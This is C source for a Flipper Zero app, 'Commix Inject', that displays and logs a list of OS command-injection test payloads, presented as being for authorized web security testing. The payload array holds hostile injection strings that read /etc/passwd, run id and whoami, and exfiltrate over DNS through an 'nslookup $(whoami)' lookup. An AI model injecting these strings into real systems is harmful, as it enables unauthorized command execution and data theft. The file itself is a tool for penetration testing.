/**
 * CYBERFLIPPER — Commix Inject
 * Command injection payload generator for authorized penetration testing.
 * Generates common OS command injection test vectors for web application
 * security auditing. Inspired by the commix project.
 *
 * FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <stdlib.h>
#include <string.h>

#define TAG "CommixInject"

typedef enum {
    InjectClassicSemicolon,
    InjectPipeChain,
    InjectBacktick,
    InjectDollarParen,
    InjectNewline,
    InjectAmpersand,
    InjectTimeBased,
    InjectDNSExfil,
    InjectFileBased,
    InjectBlind,
    InjectCount,
} InjectType;

static const char* inject_type_names[] = {
    "Classic (;)",
    "Pipe Chain (|)",
    "Backtick (`)",
    "$(command)",
    "Newline (\\n)",
    "Ampersand (&)",
    "Time-Based",
    "DNS Exfil",
    "File-Based",
    "Blind Inject",
};

static const char* inject_payloads[] = {
    ";id",
    "|cat /etc/passwd",
    "`whoami`",
    "$(uname -a)",
    "%0aid",
    "&& ls -la",
    ";sleep 5",
    ";nslookup $(whoami).x",
    ";cat /etc/passwd > /tmp/x",
    "|| ping -c 5 127.0.0.1",
};

static const char* inject_descriptions[] = {
    "Append cmd after semicolon",
    "Pipe output to new command",
    "Execute via backtick subst",
    "Dollar-paren substitution",
    "Inject via encoded newline",
    "Chain with logical AND",
    "Verify exec via time delay",
    "Exfiltrate via DNS query",
    "Write output to temp file",
    "Blind inject w/ side channel",
};

typedef struct {
    Gui* gui;
    ViewPort* view_port;
    FuriMessageQueue* event_queue;
    bool running;

    InjectType current_type;
    bool detail_view;
    uint32_t payloads_generated;
} CommixApp;

static void commix_draw_callback(Canvas* canvas, void* context) {
    CommixApp* app = (CommixApp*)context;
    canvas_clear(canvas);

    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 0, AlignCenter, AlignTop, "COMMIX INJECT");
    canvas_draw_line(canvas, 0, 10, 128, 10);

    canvas_set_font(canvas, FontSecondary);

    if(app->detail_view) {
        // Detailed payload view
        char type_str[40];
        snprintf(type_str, sizeof(type_str), "Type: %s", inject_type_names[app->current_type]);
        canvas_draw_str(canvas, 2, 20, type_str);

        canvas_draw_str(canvas, 2, 30, "Payload:");
        canvas_draw_str(canvas, 6, 40, inject_payloads[app->current_type]);

        canvas_draw_str(canvas, 2, 50, inject_descriptions[app->current_type]);

        canvas_draw_str(canvas, 2, 62, "[OK] Copy  [BACK] List");
    } else {
        // List view - show 4 items at a time
        uint8_t start = (app->current_type / 4) * 4;
        for(uint8_t i = 0; i < 4 && (start + i) < InjectCount; i++) {
            uint8_t idx = start + i;
            char line[40];
            if(idx == app->current_type) {
                snprintf(line, sizeof(line), "> %s", inject_type_names[idx]);
            } else {
                snprintf(line, sizeof(line), "  %s", inject_type_names[idx]);
            }
            canvas_draw_str(canvas, 2, 20 + (i * 10), line);
        }

        char gen_str[32];
        snprintf(gen_str, sizeof(gen_str), "Generated: %lu", app->payloads_generated);
        canvas_draw_str(canvas, 2, 62, gen_str);
    }
}

static void commix_input_callback(InputEvent* event, void* context) {
    CommixApp* app = (CommixApp*)context;
    furi_message_queue_put(app->event_queue, event, FuriWaitForever);
}

int32_t commix_inject_app(void* p) {
    UNUSED(p);

    CommixApp* app = malloc(sizeof(CommixApp));
    memset(app, 0, sizeof(CommixApp));

    app->view_port = view_port_alloc();
    app->event_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    app->running = true;

    app->gui = furi_record_open(RECORD_GUI);
    view_port_draw_callback_set(app->view_port, commix_draw_callback, app);
    view_port_input_callback_set(app->view_port, commix_input_callback, app);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    InputEvent event;
    while(app->running) {
        if(furi_message_queue_get(app->event_queue, &event, 50) == FuriStatusOk) {
            if(event.type == InputTypeShort) {
                switch(event.key) {
                case InputKeyOk:
                    if(app->detail_view) {
                        app->payloads_generated++;
                        FURI_LOG_I(TAG, "Payload: %s", inject_payloads[app->current_type]);
                    } else {
                        app->detail_view = true;
                    }
                    break;
                case InputKeyDown:
                    if(!app->detail_view) {
                        app->current_type = (app->current_type + 1) % InjectCount;
                    }
                    break;
                case InputKeyUp:
                    if(!app->detail_view) {
                        app->current_type = app->current_type == 0 ?
                            InjectCount - 1 : app->current_type - 1;
                    }
                    break;
                case InputKeyBack:
                    if(app->detail_view) {
                        app->detail_view = false;
                    } else {
                        app->running = false;
                    }
                    break;
                default:
                    break;
                }
            }
        }
        view_port_update(app->view_port);
    }

    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);
    furi_message_queue_free(app->event_queue);
    free(app);
    return 0;
}
